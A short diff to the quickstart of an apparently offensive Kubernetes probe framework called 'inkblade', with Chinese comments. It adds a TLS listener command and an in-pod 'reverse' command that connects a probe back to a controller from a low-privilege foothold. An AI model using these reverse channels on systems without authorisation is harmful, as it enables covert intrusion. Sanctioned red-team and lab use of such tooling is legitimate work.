@@ -72,9 +72,14 @@ python -m inkblade up
 #    控制台打印一次性 admin 密码，监听 127.0.0.1:8765。
 
 # 3. 接入已有探针：探针主动回连控制端
+python -m inkblade channel listen \
+  --bind 0.0.0.0 --port 9443 --transport tls \
+  --token-file ./probe.token --workspace local-lab
+#    Pod 内：
+#    ./inkblade-probe reverse --transport tls --host <controller> --port 9443 \
+#      --ca-file ca.pem --pin <sha256> --sni <name> \
+#      --token-file /tmp/probe.token --probe-id pod-a
 python -m inkblade probe list
-python -m inkblade channel listen
-#    Pod 内：inkblade-probe reverse --host <controller> --port <port>
 
 # 4. 从最低权限立足点首次投放（只需出站 TCP）
 python -m inkblade session open \
